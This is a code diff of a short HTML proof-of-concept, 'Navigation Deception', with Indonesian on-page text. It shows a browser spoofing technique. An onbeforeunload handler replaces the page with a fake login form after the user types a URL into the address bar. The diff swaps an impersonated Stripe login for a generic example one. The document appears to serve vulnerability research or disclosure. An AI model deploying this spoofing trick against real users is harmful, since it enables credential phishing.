@@ -1,20 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>PoC 1 - Navigation Deception</title>
 </head>
 <body>
   <div id="content">
     <h1>Step 1</h1>
-    <p>Ketik <b>https://api.stripe.com</b> di omnibox lalu tekan Enter</p>
+    <p>Ketik <b>https://example.com</b> di omnibox lalu tekan Enter.</p>
   </div>
 
   <script>
     window.onbeforeunload = function () {
       setTimeout(() => {
         document.getElementById("content").innerHTML = `
-          <h1>Stripe</h1>
-          <p>Please login to continue</p>
+          <h1>Example Secure Login</h1>
+          <p>Login untuk melanjutkan</p>
           <input placeholder="Email"><br><br>
           <input type="password" placeholder="Password">
         `;
